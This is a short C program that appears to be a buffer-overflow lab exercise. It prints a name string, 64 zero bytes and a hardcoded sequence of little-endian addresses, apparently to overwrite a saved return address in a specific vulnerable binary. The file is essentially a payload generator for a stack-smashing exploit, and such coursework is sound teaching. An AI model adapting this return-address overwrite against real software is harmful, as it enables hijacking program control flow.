#include <stdio.h>
#include <string.h>
char attackString[] = "Rongrong Liu"; //12 characters 
int main() {
	int i;
	char *p = attackString;
	for (i = 0; i < sizeof(attackString) - 1; i++) {
		putchar(*p);
		p++;
	}

	unsigned char zero = 0x00;
	unsigned char nop = 0x90;

	for( i = 0; i < 64; i++){
			
		putchar(zero);
	}

 	
 	unsigned char 	retaddr[9] = {0xd5, 0x85, 0x04, 0x08, 0x18, 0xa0, 0x04, 0x08, 0x01};

	for( i = 0; i < 9; i++){
		putchar(retaddr[i]);
	}	


		return 1;
	}